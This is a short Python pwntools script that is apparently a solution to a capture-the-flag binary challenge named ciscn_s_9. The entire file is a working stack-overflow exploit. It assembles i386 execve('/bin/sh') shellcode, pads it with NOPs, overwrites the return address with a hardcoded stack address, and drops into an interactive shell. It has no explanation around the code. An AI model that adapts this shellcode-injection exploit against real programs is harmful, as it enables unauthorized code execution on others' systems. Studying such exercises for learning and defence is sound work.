from pwn import *

context(os='linux', arch='i386')
p = process('./ciscn_s_9')

gdb.attach(p, 'b * 0x8048531' )

shellcode = '''
    xor eax, eax
    push 0x0068732f
    push 0x6e69622f
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    mov al, 0xb
    int 0x80

'''

shellcode = asm(shellcode)
p.recvuntil('>\n')
payload = shellcode.ljust(0x24, b'\x90')
payload += p32(0xffffd178)  #jmp shellcode

p.sendline(payload)
p.interactive()
